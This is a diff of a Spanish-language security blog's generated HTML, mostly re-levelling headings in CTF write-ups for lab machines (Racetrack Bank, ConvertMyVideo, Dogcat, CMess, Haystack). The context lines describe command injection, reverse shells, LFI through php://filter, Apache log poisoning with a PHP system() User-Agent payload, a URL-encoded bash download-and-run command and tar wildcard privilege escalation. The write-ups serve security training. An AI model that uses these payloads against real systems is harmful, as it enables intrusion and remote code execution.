 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_174728.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Analizamos las peticiones con Burpsuite y vemos que en el header de la respuesta &lt;code&gt;Express&lt;/code&gt; por lo que podemos deducir que la pagina esta corriendo en NodeJS.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_175108.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;transferencia-asincrona-gold---wfuzz-&#34;&gt;Transferencia Asincrona GOLD - WFUZZ&lt;/h2&gt;
+&lt;h1 id=&#34;transferencia-asincrona-gold---wfuzz&#34;&gt;Transferencia Asincrona GOLD - WFUZZ&lt;/h1&gt;
 &lt;p&gt;Creamos una segunda cuenta, para poder regalar &lt;code&gt;Gold&lt;/code&gt; a esta desde la primera cuenta. Le damos &lt;code&gt;1 Gold&lt;/code&gt; a pika desde test, y al hacer esto, test se queda en 0 y pika tiene 2, entonces, dependiendo de cuantas &lt;code&gt;Gold&lt;/code&gt; tengamos, esa cantidad podemos regalar, hay que mencionar que se tarda en realizar la transaccion.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_175340.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Hasta este punto, no habia otra parte en donde podriamos realizar alguna explotacion, por lo que &lt;em&gt;podríamos&lt;/em&gt; crear 10 mil cuentas y utilizar esas cuentas para dar a una sola los &lt;code&gt;10,000 Gold&lt;/code&gt; para comprar una cuenta premium y ver lo que hay ahí pero no seria lo mejor.&lt;/p&gt;
@@ -3351,7 +3351,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_185039.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Ahora realizamos una transaccion de &lt;code&gt;test a pika&lt;/code&gt; y volvemos a hacer lo mismo con wfuzz (aumentamos 5 en 5 nuestro diccionario) asi hasta lograr los &lt;code&gt;Gold&lt;/code&gt; necesarios para una cuenta premium en la cuenta test. Por alguna razon al realizar esta &amp;ldquo;explotacion&amp;rdquo; en ambas cuentas aumentan los &lt;code&gt;Gold&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_191944.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;brian-user---rce-nodejs-&#34;&gt;BRIAN USER - RCE NodeJS&lt;/h3&gt;
+&lt;h2 id=&#34;brian-user---rce-nodejs&#34;&gt;BRIAN USER - RCE NodeJS&lt;/h2&gt;
 &lt;p&gt;Hacemos la compra de una cuenta Premium, y podemos acceder a la pagina &lt;code&gt;Premium Features&lt;/code&gt; donde encontramos un input que al ingresar una operacion matematica nos devuelve el resultado.&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44&#34;&gt;&lt;strong&gt;NODEJS RCE&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_192105.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
@@ -3364,7 +3364,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_195548.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Tambien encontramos las credenciales de la base de datos&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_195734.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Dentro de la maquina encontramos un binario el cual tiene permisos root, pero al anlizarlo y ejecutarlo no se pudo hacer mayor cosa.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_204759.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Utilizamos pspy para ver los cron job, y encontramos uno que ejecuta &lt;code&gt;cleanupscript.sh&lt;/code&gt; que se encuentra en &lt;code&gt;/home/brian/cleanup/&lt;/code&gt;.&lt;br /&gt;
@@ -3429,7 +3429,7 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -3456,7 +3456,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -3486,10 +3486,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue May  5 19:03:30 2020 -- 1 IP address (1 host up) scanned in 43.02 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;Encontramos una pagina sencilla en el puerto 80, en la que nos muestra un formulario en donde nos pide un ID de un video de YouTube.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_185935.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h3&gt;
+&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
 &lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -3517,7 +3517,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_191521.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Utilizamos Burpsuite para capturar el envio de el ID, le agregamos un ID erroneo y nos da una respuesta en el que nos devuelve el error que se generó.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_191641.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;command-injection-&#34;&gt;COMMAND INJECTION&lt;/h2&gt;
+&lt;h1 id=&#34;command-injection&#34;&gt;COMMAND INJECTION&lt;/h1&gt;
 &lt;p&gt;Eliminamos la URL y enviamos algo diferente, y vemos que el mensaje de error contiene el nombre de una herramienta que se utiliza para descargar videos de YouTube - youtube-dl.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_191917.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Para verificar que esa herramienta esta siendo utilizada con la pagina, enviamos la flag &lt;code&gt;--help&lt;/code&gt; para confirmar que es esa herramienta, y nos devolvió todas las opciones.&lt;/p&gt;
@@ -3600,7 +3600,7 @@ Options -Indexes
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_214331.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Vemos que podemos ejecutar comandos:&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_214431.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;user---www-data-&#34;&gt;USER - WWW-DATA&lt;/h2&gt;
+&lt;h1 id=&#34;user---www-data&#34;&gt;USER - WWW-DATA&lt;/h1&gt;
 &lt;p&gt;Utilizamos python para ejecutar nuestra shell inversa y ponemos a la escucha nuestro netcat.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -3612,7 +3612,7 @@ Options -Indexes
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Logramos obtener una shell con usuario &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_215113.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Mediante una enumeracion basica de binarios no encontramos alguno que nos puediera ayudar, utilizamos &lt;code&gt;pspy&lt;/code&gt; para ver si existe algun cronjob en la maquina. Encontramos que se ejecuta un cronjob el cual ejecuta el archivo &lt;code&gt;clean.sh&lt;/code&gt; que se encuentra en &lt;code&gt;/var/www/html/tmp/&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_222133.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Agregamos una shell inversa a este archivo y pusimos a la escucha netcat, logramos obtener una shell con usuario root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
@@ -3665,7 +3665,7 @@ Options -Indexes
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -3692,7 +3692,7 @@ Options -Indexes
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (445) y el puerto ssh (22) abiertos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -3758,13 +3758,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 /dog.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http-&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;Encontramos una pagina sencilla en el puerto 80, que al darle click a la opcion de perro (dog) nos muestra una imagen.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.07.10.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Vemos que en la url le pasa por parametro la palabra dog. Dentro del escaneo de GOBUSTER vimos que existe un archivo cat y dog con extension en php, al ver el codigo fuente de ambas paginas y al recargar por repetidas ocaciones la imagen que genera junto al codigo html es distinta.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.10.03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Por lo que cada vez que se selecciona la opcion de dog o cat, nos muéstra distintas imagenes.&lt;/p&gt;
-&lt;h2 id=&#34;lfi---cat-or-dog-&#34;&gt;LFI - CAT OR DOG&lt;/h2&gt;
+&lt;h1 id=&#34;lfi---cat-or-dog&#34;&gt;LFI - CAT OR DOG&lt;/h1&gt;
 &lt;p&gt;Intentamos utilizar LFI basico (/etc/passwd, /var/log/apache2/access.log, etc) pero no logramos leer ninguno de los archivos ya que la pagina nos mostraba el mensaje &lt;code&gt;Sorry, only dogs or cats are allowed.&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.12.36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Lo curioso de este reto es que, al pasarle la palabra cat dentro de una peticion de un archivo o lo que fuera, nos mostraba el mensaje &lt;code&gt;Here you go!&lt;/code&gt; y un error de la funcion &lt;code&gt;include()&lt;/code&gt;. Desde aqui tiene un poco de sentido el mensaje de error anterior (&lt;code&gt;Sorry, only dogs or cats are allowed.&lt;/code&gt;) podemos utilizar tanto dog o cat dentro de las peticiones para que sean aceptadas.&lt;/p&gt;
@@ -3810,7 +3810,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;/div&gt;&lt;/details&gt;
 &lt;p&gt;Leemos el archivo flag.php y logramos leer nuestra primera flag.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.30.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;rce---apache-log-poisoning-&#34;&gt;RCE - Apache Log Poisoning&lt;/h3&gt;
+&lt;h1 id=&#34;rce---apache-log-poisoning&#34;&gt;RCE - Apache Log Poisoning&lt;/h1&gt;
 &lt;p&gt;Utilizamos el User-Agent para poder ejecutar nuestro codigo php el que tendra como objetivo obtener y ejecutar un comando que le pasemos. Utilizamos &lt;code&gt;php://filter/dog/resource=../../../../var/log/apache2/access.log&amp;amp;ext=&lt;/code&gt; para leer el archivo log, además de esto agregamos el comando que deseamos ejecutar en la maquina &lt;code&gt;&amp;amp;cmd=whoami&lt;/code&gt;, por lo que luciría de la siguiente forma.&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.hackingarticles.in/apache-log-poisoning-through-lfi/&#34;&gt;&lt;strong&gt;Apache Log Poisoning&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -3827,7 +3827,7 @@ User-Agent:Mozilla/5.0 &amp;lt;?php system&lt;span class=&#34;o&#34;&gt;(&lt;/sp
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Vemos que en la respuesta tenemos acceso como usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.38.25.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;user---www-data-&#34;&gt;USER - WWW-DATA&lt;/h2&gt;
+&lt;h1 id=&#34;user---www-data&#34;&gt;USER - WWW-DATA&lt;/h1&gt;
 &lt;p&gt;Ahora, creamos un archivo que contenga una shell inversa para descargarlo mediante un servidor de python (python3 -m http.server 80) en la maquina.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Comando para descargar y ejecutar nuestra shell (Codificamos a URL los espacios)&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -3848,7 +3848,7 @@ bash%20-c%20%20&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span cla
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.07.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Nuestra segunda flag.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.08.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;env&lt;/code&gt;. Utilizamos env para obtener una shell root.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.11.00.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -3926,7 +3926,7 @@ bash%20-c%20%20&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span cla
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/cmess/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -3955,7 +3955,7 @@ bash%20-c%20%20&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span cla
 &lt;/table&gt;
 &lt;br&gt;
 &lt;hr /&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp/udp, nmap nos muestra varios puertos abiertos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -4003,10 +4003,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Feb 14 16:45:03 2020 -- 1 IP address (1 host up) scanned in 1254.76 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;A un principio veimas Gila CMS en el cual existe una vulnerabilidad de LFI pero el de esta maquina no es vulnerable.&lt;br /&gt;
 &lt;img src=&#34;../../image/tryhackme/cmess/Screenshot_20200214_184137.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h3&gt;
+&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
 &lt;p&gt;Encontramos una larga lista de directorios, pero ninguno era de importancia hasta el momento.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -4160,10 +4160,10 @@ Filtered Requests: &lt;span class=&#34;m&#34;&gt;4991&lt;/span&gt;
 Requests/sec.: 38.07726
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;cmessthm-&#34;&gt;***.cmess.thm&lt;/h2&gt;
+&lt;/div&gt;&lt;h2 id=&#34;cmessthm&#34;&gt;***.cmess.thm&lt;/h2&gt;
 &lt;p&gt;En el subdominio dev encontramos una contraseña del correo andre.&lt;br /&gt;
 &lt;img src=&#34;../../image/tryhackme/cmess/Screenshot_20200214_184346.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;shell---www-data-&#34;&gt;SHELL - www-data&lt;/h2&gt;
+&lt;h1 id=&#34;shell---www-data&#34;&gt;SHELL - www-data&lt;/h1&gt;
 &lt;p&gt;Utilizamos las credenciales en el panel de administracion (/admin) con las credenciales que tenemos, una vez dentro subimos un archivo PHP de prueba para verificar que podamos ejecutar comandos, el archivo se subió en (/assets/).&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -4196,7 +4196,7 @@ Requests/sec.: 38.07726
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;../../image/tryhackme/cmess/Screenshot_20200214_185920.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;andre---user-&#34;&gt;Andre - User&lt;/h2&gt;
+&lt;h1 id=&#34;andre---user&#34;&gt;Andre - User&lt;/h1&gt;
 &lt;p&gt;Enumeramos la maquina en busca de archivos interesantes, en la carpeta /opt encontramos un backup de la contraseña de Andre.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -4232,7 +4232,7 @@ www-data@cmess:/opt$
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Utilizamos &amp;lsquo;su&amp;rsquo;, obtenemos una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
 &lt;img src=&#34;../../image/tryhackme/cmess/Screenshot_20200214_193421.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Dentro de los archivos de la carpeta &lt;code&gt;/tmp&lt;/code&gt; encontramos un archivo comprimido, de lo que parece &lt;code&gt;/home/andre/backup/&lt;/code&gt;, que, la realiza el usuario root cada minuto. Para ver el cambio del archivo utilizamos &lt;code&gt;date&lt;/code&gt; para ver la fecha de creacion y hora. Con lo anterior, renombramos la carpeta &lt;code&gt;backup&lt;/code&gt; a &lt;code&gt;backup_bak&lt;/code&gt;, creamos un symlink hacia la carpeta &lt;code&gt;/root/&lt;/code&gt;, el usuario root realizara un backup de la carpeta /root/.&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;O simplemente utilizar &lt;code&gt;cat /etc/crontab&lt;/code&gt; para ver los crons&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;../../image/tryhackme/cmess/Screenshot_20200214_195352.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
@@ -4362,7 +4362,7 @@ sshd:*:18299:0:99999:7:::
 andre@cmess:/tmp$
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;shell---root-&#34;&gt;SHELL - ROOT&lt;/h2&gt;
+&lt;/div&gt;&lt;h2 id=&#34;shell---root&#34;&gt;SHELL - ROOT&lt;/h2&gt;
 &lt;p&gt;Para obtener una shell con el usuario root utilizamos las &amp;lsquo;wildcards&amp;rsquo; para ejecutar una shell inversa. Creamos un archivo con nuestra shell inversa y las &amp;lsquo;wildcards&amp;rsquo; que se ejecutarán junto con el comando tar:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -4392,7 +4392,7 @@ andre@cmess:~/backup$
 &lt;/div&gt;&lt;p&gt;Esperamos y obtenemos una shell root:&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/cmess/Screenshot_20200214_215004.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/&#34;&gt;&lt;strong&gt;INFO - Wildcard Privilege Escalation&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;mysql-&#34;&gt;MYSQL&lt;/h3&gt;
+&lt;h2 id=&#34;mysql&#34;&gt;MYSQL&lt;/h2&gt;
 &lt;p&gt;Dentro de la configuracion de la pagina vemos las credenciales para conectarse a la base de datos, encontramos algunas tablas interesantes pero ningun dato nos ayudo para ninguno de los usuarios.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -4642,7 +4642,7 @@ mysql&amp;gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; * from usermeta&
     &lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -4674,7 +4674,7 @@ mysql&amp;gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; * from usermeta&
 &lt;/tbody&gt;
 &lt;/table&gt;
 &lt;hr /&gt;
-&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP##&lt;/h2&gt;
+&lt;h1 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP##&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp/udp y su servicio.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -4742,7 +4742,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Jun 29 21:51:09 2019 -- 1 IP address (1 host up) scanned in 42.27 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;gobuster---puerto-80-&#34;&gt;GOBUSTER - Puerto 80&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
+&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
 &lt;p&gt;Realizamos una busqueda de directorios y archivos en el puerto 80 http con gobuster.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
